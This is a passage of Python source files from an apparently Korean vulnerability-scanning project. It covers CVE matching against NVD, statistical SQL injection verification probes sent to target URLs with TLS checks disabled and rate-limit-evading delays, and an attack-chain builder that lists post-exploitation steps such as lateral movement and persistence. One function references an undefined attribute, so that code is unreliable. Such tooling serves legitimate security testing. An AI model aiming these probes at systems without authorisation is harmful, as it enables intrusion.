            cvss_score = vuln_item["cvss"]
            logger.debug(f"[MATCHER-CVSS] Fallback to cvss (v2): {cvss_score}")
            if "cvssVector" in vuln_item:
                cvss_vector = vuln_item["cvssVector"]
        
        # 3단계: cvss2 필드도 확인
        if not cvss_score and "cvss2" in vuln_item and vuln_item["cvss2"]:
            cvss_score = vuln_item["cvss2"]
            logger.debug(f"[MATCHER-CVSS] Fallback to cvss2: {cvss_score}")
        
        # 4단계: impact 구조에서 추출 시도 (NVD 형식)
        if not cvss_score and "impact" in vuln_item:
            impact = vuln_item["impact"]
            if "baseMetricV3" in impact:
                cvss_data = impact["baseMetricV3"].get("cvssV3", {})
                cvss_score = cvss_data.get("baseScore")
                cvss_vector = cvss_data.get("vectorString", "")
                logger.debug(f"[MATCHER-CVSS] Using impact.baseMetricV3: {cvss_score}")
            elif "baseMetricV2" in impact:
                cvss_data = impact["baseMetricV2"].get("cvssV2", {})
                cvss_score = cvss_data.get("baseScore")
                cvss_vector = cvss_data.get("vectorString", "")
                logger.debug(f"[MATCHER-CVSS] Using impact.baseMetricV2: {cvss_score}")
        
        # 5단계: 최종 확인 (None 체크)
        if not cvss_score:
            logger.warning(f"[MATCHER-CVSS] No CVSS found in vuln_item, available keys: {list(vuln_item.keys())}")
        
        # NVD API v2 형식으로 변환
        vuln_item = {
            "cve": {
                "id": vuln_item.get("id", "CVE-UNKNOWN"),
                "descriptions": [
                    {"lang": "en", "value": vuln_item.get("summary", "")}
                ],
                "metrics": {},
                "configurations": []
            }
        }
        
        # CVSS 메트릭 추가
        if cvss_score:
            vuln_item["cve"]["metrics"]["cvssMetricV31"] = [{
                "cvssData": {
                    "baseScore": cvss_score,
                    "vectorString": cvss_vector
                }
            }]
        
        # 취약한 설정 정보 추가
        if "vulnerable_configuration" in vuln_item:
            vuln_item["cve"]["configurations"] = [{
                "nodes": [{
                    "cpeMatch": [
                        {"vulnerable": True, "criteria": cpe}
                        for cpe in vuln_item["vulnerable_configuration"]
                    ]
                }]
            }]
    
    # 기존 코드 (그대로 유지)
    cve = vuln_item.get("cve", {})
    cve_id = cve.get("id")
    
    # 설명 추출
    descriptions = cve.get("descriptions", [])
    desc_text = ""
    for d in descriptions:
        if d.get("lang") == "en":
            desc_text = d.get("value", "")
            break
    
    # CVSS 점수 추출 (v31 > v30 > v2 순서)
    metrics = cve.get("metrics", {})
    cvss_score = None
    cvss_vector = None
    
    if "cvssMetricV31" in metrics:
        cvss_data = metrics["cvssMetricV31"][0]["cvssData"]
        cvss_score = cvss_data["baseScore"]
        cvss_vector = cvss_data.get("vectorString", "")
    elif "cvssMetricV30" in metrics:
        cvss_data = metrics["cvssMetricV30"][0]["cvssData"]
        cvss_score = cvss_data["baseScore"]
        cvss_vector = cvss_data.get("vectorString", "")
    elif "cvssMetricV2" in metrics:
        cvss_data = metrics["cvssMetricV2"][0]["cvssData"]
        cvss_score = cvss_data["baseScore"]
        cvss_vector = cvss_data.get("vectorString", "")
    
    cvss_val = float(cvss_score) if cvss_score is not None else 0.0
    severity = cvss_to_severity(cvss_val)
    
    # 버전 매칭 및 신뢰도 계산
    is_vulnerable = False
    match_confidence = "none"
    vulnerable_ranges = []
    
    # 원본 product 이름 정규화
    normalized_original_product = None
    if original_product:
        normalized_original_product = normalize_product_name(original_product)
    
    configurations = cve.get("configurations", [])
    for config in configurations:
        for node in config.get("nodes", []):
            for cpe_match in node.get("cpeMatch", []):
                if not cpe_match.get("vulnerable"):
                    continue
                
                # 버전 범위 정보 추출
                start_inc = cpe_match.get("versionStartIncluding")
                start_exc = cpe_match.get("versionStartExcluding")
                end_inc = cpe_match.get("versionEndIncluding")
                end_exc = cpe_match.get("versionEndExcluding")
                
                # 버전 범위 문자열 생성
                range_parts = []
                if start_inc:
                    range_parts.append(f">={start_inc}")
                elif start_exc:
                    range_parts.append(f">{start_exc}")
                
                if end_inc:
                    range_parts.append(f"<={end_inc}")
                elif end_exc:
                    range_parts.append(f"<{end_exc}")
                
                if range_parts:
                    range_text = " ".join(range_parts)
                else:
                    cpe_version = cpe_match.get("criteria", "").split(":")[-1] if ":" in cpe_match.get("criteria", "") else "*"
                    if cpe_version not in ["*", "-"]:
                        range_text = f"={cpe_version}"
                    else:
                        range_text = "모든 버전"
                
                if range_text not in vulnerable_ranges:
                    vulnerable_ranges.append(range_text)
                
                # CPE URI에서 vendor/product 추출
                cpe_uri = cpe_match.get("criteria", "")
                
                # === 1단계: vendor/product 정확 매칭 (최고 신뢰도) ===
                vendor_product_match = False
                confidence_level = "none"
                
                if target_vendor and target_product:
                    vendor_match = target_vendor.lower() in cpe_uri.lower()
                    product_match = target_product.lower() in cpe_uri.lower()
                    
                    if vendor_match and product_match:
                        vendor_product_match = True
                        confidence_level = "high"
                
                # === 2단계: CPE URI에서 추출한 정보로 매칭 (중간 신뢰도) ===
                if not vendor_product_match:
                    cpe_info = parse_cpe_uri(cpe_uri)
                    if cpe_info:
                        cpe_vendor, cpe_product = cpe_info
                        product_to_check = original_product or target_product
                        
                        if product_to_check:
                            normalized_product = normalize_product_name(product_to_check)
                            if (normalized_product in cpe_product or
                                cpe_product in normalized_product or
                                normalized_product == cpe_product):
                                vendor_product_match = True
                                confidence_level = "medium"
                
                # === 3단계: CVE 설명에서 원본 product 이름 확인 (낮은 신뢰도) ===
                description_match = False
                if not vendor_product_match and normalized_original_product:
                    desc_lower = desc_text.lower()
                    if normalized_original_product in desc_lower and len(normalized_original_product) >= 3:
                        description_match = True
                        confidence_level = "low"
                
                # === 최종 판단 ===
                if vendor_product_match or description_match:
                    # 버전 정보가 있으면 버전 범위도 확인
                    if target_version:
                        if is_version_vulnerable(target_version, cpe_match):
                            is_vulnerable = True
                            match_confidence = confidence_level
                            break
                    else:
                        # 버전이 없으면 매칭 성공만으로 판단
                        is_vulnerable = True
                        match_confidence = confidence_level
                        break
            
            if is_vulnerable:
                break
        
        if is_vulnerable:
            break
    
    return {
        "cve_id": cve_id,
        "description": desc_text,
        "cvss": cvss_val,
        "cvss_vector": cvss_vector,
        "severity": severity,
        "is_vulnerable": is_vulnerable,
        "match_confidence": match_confidence,
        "vulnerable_ranges": vulnerable_ranges,
    }


def is_version_vulnerable(target_version: str, cpe_match: dict) -> bool:
    """
    타겟 버전이 CVE의 영향 범위에 포함되는지 확인

    Args:
        target_version: 타겟 버전
        cpe_match: CPE 매치 정보

    Returns:
        취약 여부
    """
    if not target_version:
        return False

    if not VERSION_COMPARE_AVAILABLE:
        # packaging 모듈이 없으면 보수적 접근
        cpe_version = cpe_match.get("criteria", "").split(":")[-1] if ":" in cpe_match.get("criteria", "") else "*"
        if cpe_version in ["*", "-"]:
            return True
        return False

    try:
        target_ver = version.parse(target_version)
    except Exception as e:
        logger.debug(f"버전 파싱 실패: {target_version}, err={e}")
        return False

    start_inc = cpe_match.get("versionStartIncluding")
    start_exc = cpe_match.get("versionStartExcluding")
    end_inc = cpe_match.get("versionEndIncluding")
    end_exc = cpe_match.get("versionEndExcluding")

    # 버전 범위 정보가 없으면 CPE의 version 필드 확인
    if not any([start_inc, start_exc, end_inc, end_exc]):
        cpe_version = cpe_match.get("criteria", "").split(":")[-1] if ":" in cpe_match.get("criteria", "") else "*"
        if cpe_version in ["*", "-"]:
            return True
        try:
            cpe_ver = version.parse(cpe_version)
            return target_ver == cpe_ver
        except:
            return target_version == cpe_version

    # 하한선 체크
    if start_inc:
        try:
            if target_ver < version.parse(start_inc):
                return False
        except Exception as e:
            logger.debug(f"start_inc 파싱 실패: {start_inc}, err={e}")

    if start_exc:
        try:
            if target_ver <= version.parse(start_exc):
                return False
        except Exception as e:
            logger.debug(f"start_exc 파싱 실패: {start_exc}, err={e}")

    # 상한선 체크
    if end_inc:
        try:
            if target_ver > version.parse(end_inc):
                return False
        except Exception as e:
            logger.debug(f"end_inc 파싱 실패: {end_inc}, err={e}")

    if end_exc:
        try:
            if target_ver >= version.parse(end_exc):
                return False
        except Exception as e:
            logger.debug(f"end_exc 파싱 실패: {end_exc}, err={e}")

    return True

async def auto_discover_cpe_from_nvd(
    product_name: str,
    session: aiohttp.ClientSession,
    api_key: str = None
) -> Optional[str]:
    """
    NVD CPE Dictionary API로 제품명 → CPE 자동 변환

    Args:
        product_name: 제품명 (예: "OWASP Juice Shop", "Express", "nginx")
        session: aiohttp 세션
        api_key: NVD API 키

    Returns:
        CPE 문자열 또는 None
    """
    url = "https://services.nvd.nist.gov/rest/json/cpes/2.0"
    params = {
        "keywordSearch": product_name,
        "resultsPerPage": 5
    }

    headers = {}
    if api_key:
        headers["apiKey"] = api_key

    try:
        async with session.get(url, params=params, headers=headers, timeout=10) as response:
            if response.status == 200:
                data = await response.json()
                products = data.get("products", [])

                if products:
                    # 첫 번째 매칭 결과 사용
                    cpe_name = products[0].get("cpe", {}).get("cpeName")
                    if cpe_name:
                        logger.info(f"[MATCHER] Auto-discovered CPE: {product_name} → {cpe_name}")
                        return cpe_name

                logger.warning(f"[MATCHER] No CPE found in NVD for: {product_name}")
                return None
            else:
                logger.error(f"[MATCHER] CPE discovery failed: HTTP {response.status}")
                return None

    except Exception as e:
        logger.error(f"[MATCHER] CPE discovery error: {e}")
        return None

async def search_cves_universal(
    product: str,
    version: str,
    nvd_client,
    cache_manager=None,
    max_results: int = 100
) -> List[Dict[str, Any]]:
    """
    CPE 기반 검색을 우선 시도하고, 실패 시 키워드 검색으로 폴백

    Args:
        product: 제품명
        version: 버전
        nvd_client: AsyncNvdClient 인스턴스
        cache_manager: CacheManager 인스턴스
        max_results: 최대 결과 수

    Returns:
        CVE 정보 리스트
    """
    # 블랙리스트 체크
    if is_blacklisted(product):
        logger.info(f"[MATCHER] Skipping blacklisted product: {product}")
        return []

    # CPE 생성 시도
    tech = {"product": product, "version": version}
    cpe = extract_cpe_from_tech(tech)

    all_cves = []

    if cpe:
        # CPE로 검색
        logger.info(f"[MATCHER] Searching with CPE: {cpe}")

        # 캐시 확인
        if cache_manager:
            cached = cache_manager.get(cpe)
            if cached is not None:
                logger.info(f"[MATCHER] Cache hit for CPE: {cpe}")
                return cached

        # NVD API 호출
        cves = await nvd_client.search_cves_by_cpe(cpe, max_results=max_results)

        if cves:
            logger.info(f"[MATCHER] Found {len(cves)} CVEs via CPE")
            # 캐시 저장
            if cache_manager:
                cache_manager.set(cpe, cves)
            return cves
        else:
            logger.info(f"[MATCHER] No CVEs found via CPE, trying keyword search")

    # 폴백: 키워드 검색
    keyword = f"{product} {version}".strip()
    logger.info(f"[MATCHER] Fallback to keyword search: {keyword}")

    # 캐시 확인
    if cache_manager:
        cached = cache_manager.get(keyword)
        if cached is not None:
            logger.info(f"[MATCHER] Cache hit for keyword: {keyword}")
            return cached

    # NVD API 호출
    cves = await nvd_client.search_cves_by_keyword(keyword, max_results=max_results)

    if cves:
        logger.info(f"[MATCHER] Found {len(cves)} CVEs via keyword")
        # 캐시 저장
        if cache_manager:
            cache_manager.set(keyword, cves)

    return cves

def cvss_to_severity(score: float) -> str:
    """
    CVSS 점수를 위험도 라벨로 변환

    Args:
        score: CVSS 점수 (0.0 ~ 10.0)

    Returns:
        위험도 라벨 (Critical/High/Medium/Low/None)
    """
    if score >= 9.0:
        return "Critical"
    elif score >= 7.0:
        return "High"
    elif score >= 4.0:
        return "Medium"
    elif score > 0:
        return "Low"
    else:
        return "None"

def deduplicate_cves(cves: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    """
    CVE 중복 제거 (CVE ID 기준, CVSS 높은 것 우선)
    """
    seen = {}
    skipped_count = 0

    for idx, cve in enumerate(cves):
        # 🔥 핵심 수정: 두 가지 키 모두 시도
        cve_id = cve.get("cve_id") or cve.get("cveid")  # ← 이 줄만 수정!

        if not cve_id:
            skipped_count += 1
            logger.warning(f"[CVE-DEDUP] Skipping CVE without ID: keys={list(cve.keys())[:5]}")
            continue

        # 🔥 동일 CVE ID면 CVSS 높은 것만 유지
        if cve_id in seen:
            existing_cvss = seen[cve_id].get("cvss", 0) or seen[cve_id].get("cvss_score", 0)
            new_cvss = cve.get("cvss", 0) or cve.get("cvss_score", 0)

            # float 변환
            try:
                existing_cvss = float(existing_cvss) if existing_cvss else 0.0
                new_cvss = float(new_cvss) if new_cvss else 0.0
            except (ValueError, TypeError):
                existing_cvss = 0.0
                new_cvss = 0.0

            if new_cvss > existing_cvss:
                seen[cve_id] = cve
                logger.debug(f"[CVE-DEDUP] Updated {cve_id}: CVSS {existing_cvss} -> {new_cvss}")
        else:
            seen[cve_id] = cve
            logger.debug(f"[CVE-DEDUP] Added {cve_id}")

    logger.info(f"[CVE-DEDUP] Skipped {skipped_count} CVEs without ID")
    logger.info(f"[CVE-DEDUP] Deduplication: {len(cves)} -> {len(seen)} unique CVEs")

    return list(seen.values())
```
---

## File 13: __init__.py
**Absolute Path:** `d:\3차 프로젝트\6트\12.26 app\app\core\exploit\__init__.py`

```python
# app/core/exploit/__init__.py

from .verifier import ExploitVerifier
from .web_vulnerabilities import WebVulnerabilityScanner
from .attack_chain import AttackChainBuilder, Vulnerability, AttackStep, AttackPath
from .latest_vectors import LatestAttackVectors
from .auth_session import AuthSessionTester
from .db_advanced import AdvancedDatabaseAttacks

__all__ = [
    'ExploitVerifier',
    'WebVulnerabilityScanner',
    'AttackChainBuilder',
    'Vulnerability',
    'AttackStep',
    'AttackPath',
    'LatestAttackVectors',
    'AuthSessionTester',
    'AdvancedDatabaseAttacks'
]

```
---

## File 14: advanced_verification.py
**Absolute Path:** `d:\3차 프로젝트\6트\12.26 app\app\core\exploit\advanced_verification.py`

```python
# app/core/exploit/advanced_verification.py
# 다단계 검증 및 컨텍스트 인식 탐지

import time
import random
import statistics
import logging
from typing import Dict, Any, List, Optional
import requests

logger = logging.getLogger(__name__)


class AdvancedVerification:
    """
    다단계 검증 및 컨텍스트 인식 탐지
    """
    
    def __init__(self, min_samples: int = 3, confidence_threshold: float = 0.8):
        """
        Args:
            min_samples: 최소 샘플 수 (통계적 유의성)
            confidence_threshold: 신뢰도 임계값
        """
        self.min_samples = min_samples
        self.confidence_threshold = confidence_threshold
    
    def verify_time_based_sqli(
        self,
        url: str,
        payload: str,
        expected_delay: float = 5.0,
        samples: int = 5
    ) -> Dict[str, Any]:
        """
        Time-based SQL Injection 다단계 검증
        
        여러 번 반복 측정하여 통계적 유의성 확인
        """
        delays = []
        status_codes = []
        content_lengths = []
        
        for i in range(samples):
            try:
                start = time.time()
                response = requests.get(
                    url,
                    params={"id": payload},
                    timeout=expected_delay + 5,
                    verify=False
                )
                elapsed = time.time() - start
                
                delays.append(elapsed)
                status_codes.append(response.status_code)
                content_lengths.append(len(response.content))
                
                # 랜덤 딜레이 (Rate Limiting 대응)
                time.sleep(random.uniform(0.5, 1.5))
                
            except Exception as e:
                logger.debug(f"Time-based SQLi 검증 샘플 {i+1} 실패: {e}")
                continue
        
        if len(delays) < self.min_samples:
            return {
                "verified": False,
                "reason": f"충분한 샘플 수집 실패 (수집: {len(delays)}, 필요: {self.min_samples})"
            }
        
        # 통계 분석
        mean_delay = statistics.mean(delays)
        median_delay = statistics.median(delays)
        std_dev = statistics.stdev(delays) if len(delays) > 1 else 0
        
        # 신뢰도 계산
        delay_diff = abs(mean_delay - expected_delay)
        confidence = 1.0 - min(1.0, delay_diff / expected_delay)
        
        # 컨텍스트 분석
        status_consistent = len(set(status_codes)) == 1
        content_stable = max(content_lengths) - min(content_lengths) < 100
        
        # 최종 판단
        is_vulnerable = (
            mean_delay >= expected_delay * 0.9 and  # 90% 이상 지연
            confidence >= self.confidence_threshold and  # 신뢰도 임계값 이상
            std_dev < expected_delay * 0.3  # 표준편차가 작음 (일관성)
        )
        
        return {
            "verified": is_vulnerable,
            "confidence": confidence,
            "statistics": {
                "mean_delay": mean_delay,
                "median_delay": median_delay,
                "std_dev": std_dev,
                "samples": len(delays),
                "expected_delay": expected_delay
            },
            "context": {
                "status_consistent": status_consistent,
                "content_stable": content_stable,
                "status_codes": status_codes,
                "content_lengths": content_lengths
            }
        }
    
    def verify_error_based_sqli(
        self,
        url: str,
        payload: str,
        error_patterns: List[str]
    ) -> Dict[str, Any]:
        """
        Error-based SQL Injection 컨텍스트 인식 탐지
        
        HTTP 상태 코드, 응답 시간, 콘텐츠 길이 변화 종합 분석
        """
        try:
            # 정상 요청 (베이스라인)
            baseline_response = requests.get(
                url,
                params={"id": "1"},
                timeout=10,
                verify=False
            )
            baseline_status = baseline_response.status_code
            baseline_length = len(baseline_response.content)
            baseline_time = baseline_response.elapsed.total_seconds()
            
            # 페이로드 요청
            payload_response = requests.get(
                url,
                params={"id": payload},
                timeout=10,
                verify=False
            )
            payload_status = payload_response.status_code
            payload_length = len(payload_response.content)
            payload_time = payload_response.elapsed.total_seconds()
            
            # 컨텍스트 분석
            status_changed = baseline_status != payload_status
            length_changed = abs(baseline_length - payload_length) > 100
            time_changed = abs(baseline_time - payload_time) > 1.0
            
            # 에러 패턴 매칭
            error_found = False
            matched_pattern = None
            response_text = payload_response.text.lower()
            
            for pattern in error_patterns:
                if pattern.lower() in response_text:
                    error_found = True
                    matched_pattern = pattern
                    break
            
            # 신뢰도 계산
            confidence = 0.0
            if error_found:
                confidence += 0.5
            if status_changed:
                confidence += 0.2
            if length_changed:
                confidence += 0.2
            if time_changed:
                confidence += 0.1
            
            is_vulnerable = confidence >= self.confidence_threshold
            
            return {
                "verified": is_vulnerable,
                "confidence": confidence,
                "error_found": error_found,
                "matched_pattern": matched_pattern,
                "context": {
                    "status_changed": status_changed,
                    "length_changed": length_changed,
                    "time_changed": time_changed,
                    "baseline": {
                        "status": baseline_status,
                        "length": baseline_length,
                        "time": baseline_time
                    },
                    "payload": {
                        "status": payload_status,
                        "length": payload_length,
                        "time": payload_time
                    }
                }
            }
            
        except requests.Timeout as e:
            logger.warning(f"Timeout during error-based SQLi verification: {url}")
            return {
                "verified": False,
                "error": f"Timeout: {str(e)}"
            }
        except requests.ConnectionError as e:
            logger.error(f"Connection error during error-based SQLi verification: {e}")
            return {
                "verified": False,
                "error": f"Connection error: {str(e)}"
            }
        except Exception as e:
            logger.exception(f"Unexpected error during error-based SQLi verification: {e}")
            return {
                "verified": False,
                "error": str(e)
            }
    
    def verify_boolean_based_sqli(
        self,
        url: str,
        parameter: str,
        true_payload: str,
        false_payload: str,
        samples: int = 3
    ) -> Dict[str, Any]:
        """
        Boolean-based Blind SQL Injection 다단계 검증
        
        Args:
            url: 기본 URL
            parameter: 파라미터 이름
            true_payload: True 조건 페이로드
            false_payload: False 조건 페이로드
            samples: 샘플 수
        """
        from urllib.parse import quote
        
        true_responses = []
        false_responses = []
        
        for i in range(samples):
            try:
                # True 조건
                true_response = requests.get(
                    url,
                    params={parameter: true_payload},
                    timeout=10,
                    verify=False
                )
                true_responses.append({
                    "length": len(true_response.content),
                    "status": true_response.status_code,
                    "time": true_response.elapsed.total_seconds()
                })
                
                time.sleep(random.uniform(0.5, 1.0))
                
                # False 조건
                false_response = requests.get(
                    url,
                    params={parameter: false_payload},
                    timeout=10,
                    verify=False
                )
                false_responses.append({
                    "length": len(false_response.content),
                    "status": false_response.status_code,
                    "time": false_response.elapsed.total_seconds()
                })
                
                time.sleep(random.uniform(0.5, 1.0))
                
            except Exception as e:
                logger.debug(f"Boolean-based SQLi 검증 샘플 {i+1} 실패: {e}")
                continue
        
        if len(true_responses) < self.min_samples or len(false_responses) < self.min_samples:
            return {
                "verified": False,
                "reason": "충분한 샘플 수집 실패"
            }
        
        # 통계 분석
        true_lengths = [r["length"] for r in true_responses]
        false_lengths = [r["length"] for r in false_responses]
        
        true_mean = statistics.mean(true_lengths)
        false_mean = statistics.mean(false_lengths)
        
        length_diff = abs(true_mean - false_mean)
        length_diff_ratio = length_diff / max(true_mean, false_mean) if max(true_mean, false_mean) > 0 else 0
        
        # 신뢰도 계산
        confidence = min(1.0, length_diff_ratio * 2)  # 차이가 클수록 높은 신뢰도
        
        is_vulnerable = (
            length_diff > 100 and  # 최소 100바이트 차이
            confidence >= self.confidence_threshold
        )
        
        return {
            "verified": is_vulnerable,
            "confidence": confidence,
            "statistics": {
                "true_mean_length": true_mean,
                "false_mean_length": false_mean,
                "length_difference": length_diff,
                "samples": len(true_responses)
            }
        }

```
---

## File 15: attack_chain.py
**Absolute Path:** `d:\3차 프로젝트\6트\12.26 app\app\core\exploit\attack_chain.py`

```python
# app/core/exploit/attack_chain.py
# 익스플로잇 체인 구축 및 Attack Path Analysis

import logging
from typing import Dict, Any, List, Optional
from dataclasses import dataclass, field

logger = logging.getLogger(__name__)


@dataclass
class Vulnerability:
    """취약점 정보"""
    cve_id: Optional[str] = None
    type: str = ""
    severity: str = "MEDIUM"
    cvss_score: float = 0.0
    cvss_vector: str = ""
    description: str = ""
    exploit_verified: bool = False
    confidence: float = 0.0
    affected_component: str = ""
    attack_vector: str = ""


@dataclass
class AttackStep:
    """공격 단계"""
    step_id: int = 0
    vulnerability: Vulnerability = field(default_factory=Vulnerability)
    required_access: str = "None"  # None, Low, Medium, High, Root
    gained_access: str = "None"
    description: str = ""
    prerequisites: List[int] = field(default_factory=list)  # 선행 단계 ID


@dataclass
class AttackPath:
    """공격 경로"""
    path_id: str = ""
    steps: List[AttackStep] = field(default_factory=list)
    total_cvss: float = 0.0
    feasibility: float = 0.0
    impact: str = ""


class AttackChainBuilder:
    """
    익스플로잇 체인 구축 및 Attack Path Analysis
    """
    
    def __init__(self):
        self.vulnerabilities: List[Vulnerability] = []
        self.attack_paths: List[AttackPath] = []
    
    def add_vulnerability(self, vuln: Vulnerability):
        """취약점 추가"""
        self.vulnerabilities.append(vuln)
    
    def generate_cvss_vector(self, vuln: Vulnerability) -> str:
        """
        CVSS 3.1 벡터 문자열 생성
        
        Args:
            vuln: 취약점 정보
        
        Returns:
            CVSS 벡터 문자열 (예: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H")
        """
        # Attack Vector
        if vuln.attack_vector:
            av = vuln.attack_vector[:1]  # N, A, L, P
        else:
            av = "N"  # Network (기본값)
        
        # Attack Complexity
        if vuln.detection_method == "time_based" or vuln.detection_method == "boolean_based":
            ac = "H"  # High (복잡함)
        else:
            ac = "L"  # Low
        
        # Privileges Required
        pr = "N"  # None (기본값)
        
        # User Interaction
        ui = "N"  # None (기본값)
        
        # Scope
        s = "U"  # Unchanged (기본값)
        
        # Confidentiality Impact
        if vuln.severity == "CRITICAL":
            c = "H"
        elif vuln.severity == "HIGH":
            c = "H"
        elif vuln.severity == "MEDIUM":
            c = "L"
        else:
            c = "N"
        
        # Integrity Impact
        i = c  # 동일하게 설정
        
        # Availability Impact
        if "DoS" in vuln.type or "Denial" in vuln.type:
            a = "H"
        else:
            a = "N"
        
        vector = f"CVSS:3.1/AV:{av}/AC:{ac}/PR:{pr}/UI:{ui}/S:{s}/C:{c}/I:{i}/A:{a}"
        return vector
    
    def calculate_cvss(self, vuln: Vulnerability) -> float:
        """
        CVSS 3.1 스코어 계산 (개선된 버전)
        
        실제로는 CVSS 계산 라이브러리 사용 권장
        """
        # CVSS 벡터가 없으면 생성
        if not vuln.cvss_vector:
            vuln.cvss_vector = self.generate_cvss_vector(vuln)
        
        # 실제 CVSS 라이브러리 사용 시도
        try:
            from cvss import CVSS3
            
            c = CVSS3(vuln.cvss_vector)
            return c.base_score
        except ImportError:
            logger.debug("cvss 라이브러리가 없어 기본 계산 사용")
        except Exception as e:
            logger.debug(f"CVSS 라이브러리 사용 실패: {e}")
        
        # Fallback: 개선된 계산
        severity_scores = {
            "CRITICAL": 9.0,
            "HIGH": 7.5,
            "MEDIUM": 5.0,
            "LOW": 3.5
        }
        
        base_score = severity_scores.get(vuln.severity, 5.0)
        
        # Attack Vector 가중치
        av_weights = {
            "NETWORK": 0.85,
            "ADJACENT": 0.62,
            "LOCAL": 0.55,
            "PHYSICAL": 0.2
        }
        
        av_weight = av_weights.get(vuln.attack_vector, 0.85)
        base_score *= av_weight
        
        # Exploit 검증 보너스
        if vuln.exploit_verified:
            base_score = min(10.0, base_score + 0.5)
        
        # Confidence 보정 (0.7 ~ 1.0 범위)
        confidence_factor = 0.7 + 0.3 * vuln.confidence
        base_score *= confidence_factor
        
        return min(10.0, max(0.0, base_score))
    
    def build_attack_paths(self) -> List[AttackPath]:
        """
        공격 경로 자동 구축
        
        정보 노출 → 권한 상승 → RCE로 이어지는 경로 매핑
        """
        paths = []
        
        # 1단계: 정보 노출 취약점 찾기
        info_disclosure = [v for v in self.vulnerabilities if self._is_info_disclosure(v)]
        
        # 2단계: 권한 상승 취약점 찾기
        privilege_escalation = [v for v in self.vulnerabilities if self._is_privilege_escalation(v)]
        
        # 3단계: RCE 취약점 찾기
        rce_vulns = [v for v in self.vulnerabilities if self._is_rce(v)]
        
        # 경로 1: 정보 노출 → RCE
        for info_vuln in info_disclosure:
            for rce_vuln in rce_vulns:
                path = AttackPath(
                    path_id=f"INFO_TO_RCE_{len(paths)}",
                    steps=[
                        AttackStep(
                            step_id=1,
                            vulnerability=info_vuln,
                            required_access="None",
                            gained_access="Low",
                            description="정보 노출을 통한 초기 접근",
                            prerequisites=[]
                        ),
                        AttackStep(
                            step_id=2,
                            vulnerability=rce_vuln,
                            required_access="Low",
                            gained_access="Root",
                            description="RCE를 통한 완전한 시스템 제어",
                            prerequisites=[1]
                        )
                    ],
                    total_cvss=self.calculate_cvss(info_vuln) + self.calculate_cvss(rce_vuln),
                    feasibility=self._calculate_feasibility([info_vuln, rce_vuln]),
                    impact="CRITICAL"
                )
                paths.append(path)
        
        # 경로 2: 정보 노출 → 권한 상승 → RCE
        for info_vuln in info_disclosure:
            for priv_vuln in privilege_escalation:
                for rce_vuln in rce_vulns:
                    path = AttackPath(
                        path_id=f"INFO_TO_PRIV_TO_RCE_{len(paths)}",
                        steps=[
                            AttackStep(
                                step_id=1,
                                vulnerability=info_vuln,
                                required_access="None",
                                gained_access="Low",
                                description="정보 노출",
                                prerequisites=[]
                            ),
                            AttackStep(
                                step_id=2,
                                vulnerability=priv_vuln,
                                required_access="Low",
                                gained_access="High",
                                description="권한 상승",
                                prerequisites=[1]
                            ),
                            AttackStep(
                                step_id=3,
                                vulnerability=rce_vuln,
                                required_access="High",
                                gained_access="Root",
                                description="RCE",
                                prerequisites=[2]
                            )
                        ],
                        total_cvss=(
                            self.calculate_cvss(info_vuln) +
                            self.calculate_cvss(priv_vuln) +
                            self.calculate_cvss(rce_vuln)
                        ),
                        feasibility=self._calculate_feasibility([info_vuln, priv_vuln, rce_vuln]),
                        impact="CRITICAL"
                    )
                    paths.append(path)
        
        # CVSS 점수로 정렬
        paths.sort(key=lambda p: p.total_cvss, reverse=True)
        
        self.attack_paths = paths
        return paths
    
    def _is_info_disclosure(self, vuln: Vulnerability) -> bool:
        """정보 노출 취약점 판단"""
        info_types = [
            "LFI", "Path Traversal", "XXE", "SSRF",
            "Information Disclosure", "Directory Listing"
        ]
        return any(t in vuln.type for t in info_types)
    
    def _is_privilege_escalation(self, vuln: Vulnerability) -> bool:
        """권한 상승 취약점 판단"""
        priv_types = [
            "Broken Authentication", "Session Fixation",
            "IDOR", "Privilege Escalation"
        ]
        return any(t in vuln.type for t in priv_types)
    
    def _is_rce(self, vuln: Vulnerability) -> bool:
        """RCE 취약점 판단"""
        rce_types = [
            "Command Injection", "Code Injection", "RCE",
            "SSTI", "Deserialization", "Log4Shell"
        ]
        return any(t in vuln.type for t in rce_types)
    
    def _calculate_feasibility(self, vulns: List[Vulnerability]) -> float:
        """공격 경로의 실행 가능성 계산"""
        if not vulns:
            return 0.0
        
        # 모든 취약점이 검증되었는지
        all_verified = all(v.exploit_verified for v in vulns)
        
        # 평균 신뢰도
        avg_confidence = sum(v.confidence for v in vulns) / len(vulns)
        
        # 실행 가능성 = (검증 여부 * 0.5) + (신뢰도 * 0.5)
        feasibility = (1.0 if all_verified else 0.5) * 0.5 + avg_confidence * 0.5
        
        return feasibility
    
    def get_critical_paths(self, limit: int = 5) -> List[AttackPath]:
        """가장 위험한 공격 경로 반환"""
        if not self.attack_paths:
            self.build_attack_paths()
        
        return self.attack_paths[:limit]
    
    def generate_post_exploitation_scenarios(self, initial_access: str) -> List[Dict[str, Any]]:
        """
        Post-Exploitation 시뮬레이션
        
        권한 획득 후 추가 정찰 및 피벗팅 시나리오
        """
        scenarios = []
        
        if initial_access in ["Low", "Medium", "High", "Root"]:
            # 시나리오 1: 추가 정보 수집
            scenarios.append({
                "scenario": "Information Gathering",
                "steps": [
                    "Enumerate system information",
                    "Check for sensitive files",
                    "Search for credentials",
                    "Identify network topology"
                ],
                "impact": "MEDIUM"
            })
            
            # 시나리오 2: 권한 상승 시도
            if initial_access != "Root":
                scenarios.append({
                    "scenario": "Privilege Escalation",
                    "steps": [
                        "Check for SUID binaries",
                        "Analyze running processes",
                        "Check for misconfigured services",
                        "Search for kernel exploits"
                    ],
                    "impact": "HIGH"
                })
            
            # 시나리오 3: 피벗팅
            scenarios.append({
                "scenario": "Pivoting",
                "steps": [
                    "Map internal network",
                    "Identify additional targets",
                    "Establish persistent access",
                    "Lateral movement"
                ],
                "impact": "HIGH"
            })
        
        return scenarios

```
---

## File 16: auth_session.py
**Absolute Path:** `d:\3차 프로젝트\6트\12.26 app\app\core\exploit\auth_session.py`

```python
# app/core/exploit/auth_session.py
# 인증 및 세션 관리 테스트

import requests
import time
import re
import logging
from typing import Dict, Any, List, Optional
from urllib.parse import urljoin, urlparse

logger = logging.getLogger(__name__)


class AuthSessionTester:
    """
    인증 및 세션 관리 취약점 테스트
    """
    
    def __init__(self, timeout: int = 10):
        self.timeout = timeout
        self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    
    def test_broken_authentication(self, url: str) -> Dict[str, Any]:
        """
